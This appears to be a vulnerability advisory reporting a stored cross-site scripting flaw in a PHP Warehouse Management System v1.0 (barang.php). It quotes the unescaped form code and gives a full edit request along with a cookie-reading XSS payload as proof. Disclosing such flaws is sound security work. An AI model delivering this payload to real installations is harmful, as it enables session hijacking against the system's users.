Warehouse Management System Store XSS on (barang.php) 

```
/ci_wms/application/views/admin/content/website/barang.php
```

Vendor Homepage:

```
https://www.sourcecodester.com/php-codeigniter-warehouse-management-system-free-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/ci_wms/application/views/admin/content/website/barang.php
```

The potential risk of Cross-Site Scripting (XSS) arises because the values of the `$nama_barang` and `$merek` variables are directly inserted into the `value` attribute of HTML input fields without undergoing HTML entity encoding. This means that if these variables contain malicious JavaScript code,  this code will be executed by the browser when the page loads.

```
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Item name</label>
                                <input type="text" value="<?php echo $nama_barang; ?>" class="form-control input-sm" id="nama_barang" name="nama_barang" placeholder="Item name"
                                    required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Brand</label>
                                <input type="text" value="<?php echo $merek; ?>" class="form-control input-sm" id="merek" name="merek"
                                    placeholder="Brand" required/>
                            </div>
```

Proof of vulnerability:

Request:

```
POST /ci_wms/website/barang/edit/15 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_wms/website/barang/edit/15
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; sessions=iu3vtuuc2lqhggpfd1jmfqgbqt7jevjr
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

id_barang=15&nama_barang=Item+02&merek=B+ONE&simpan=Update+Data
```
payload:
```
<img src=x onerRor=alert(document.cookie)>
```
<img width="1331" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/43a65cc8-2f15-4469-b073-c5914046c301">

<img width="1327" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/58e2cbd8-e710-4637-a641-ce14c68c2441">



